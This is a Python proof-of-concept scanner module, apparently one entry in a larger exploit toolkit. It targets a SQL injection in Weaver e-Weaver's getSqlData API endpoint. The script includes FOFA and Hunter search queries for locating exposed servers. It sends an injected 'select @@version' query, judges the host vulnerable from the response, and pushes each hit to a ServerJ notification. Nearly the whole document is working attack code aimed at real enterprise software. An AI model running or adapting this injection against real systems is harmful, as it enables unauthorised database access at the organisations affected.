# "106.泛微e-Weaver SQL注入":
# fofa     app="泛微-E-Weaver"
# hunter   app.name="泛微 e-Weaver"

import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

bugName = "泛微e-Weaver SQL注入"


def scan_Fanwei_e_Weaver_sql_injection(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    target_url = url + path

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }

    append_to_output(f"扫描目标: {url}", "blue")
    append_to_output("===================================================================", "green")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req1 = requests.get(target_url, headers=headers, verify=False, timeout=20, proxies=proxies)

        if req1.status_code == 200 and 'api_status' in req1.text and 'data' in req1.text:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
    except requests.Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "orange")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "orange")
        else:
            append_to_output(str(e), "orange")
